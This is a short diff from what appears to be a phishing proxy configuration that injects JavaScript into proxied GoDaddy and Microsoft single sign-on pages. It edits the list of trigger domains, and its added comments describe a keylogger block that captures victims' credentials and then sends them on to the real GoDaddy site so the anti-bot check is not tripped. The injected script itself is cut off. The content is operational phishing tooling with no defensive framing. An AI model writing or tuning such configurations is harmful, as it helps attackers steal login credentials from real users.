@@ -308,7 +308,11 @@ js_inject:
   # If sub_filters miss either (compression, dynamic strings), this rewrites
   # them to our proxy at runtime so the user lands on /common/SAS/ProcessAuth
   # under woman.<phish_domain> instead of the real Microsoft.
-  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net", "sso.godaddy.com"]
+  # Note: do NOT include sso.godaddy.com here — it has its own keylogger
+  # block below (line ~570) that intentionally redirects victims to the real
+  # GoDaddy after credentials are captured (Kasada anti-bot can't be
+  # proxied). Hooking window.location here would defeat that recovery.
+  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net"]
     trigger_paths: ["/*", "/"]
     script: |
       (function() {
